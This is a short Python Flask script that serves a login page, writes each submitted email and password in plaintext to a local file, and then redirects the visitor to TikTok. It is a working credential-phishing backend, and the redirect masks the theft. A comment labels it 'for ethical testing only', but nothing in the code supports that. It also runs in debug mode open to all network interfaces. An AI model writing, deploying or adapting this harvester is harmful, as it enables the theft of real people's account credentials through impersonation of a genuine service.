from flask import Flask, render_template, request, redirect

app = Flask(__name__)

@app.route('/')
def login():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    email = request.form['email']
    password = request.form['password']
    
    # Save login info (for ethical testing only)
    with open("bg.txt", "a") as f:
        f.write(f'Email: {email}, Password: {password}\n')
    


    # Redirect to TikTok
    return redirect("https://www.tiktok.com")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
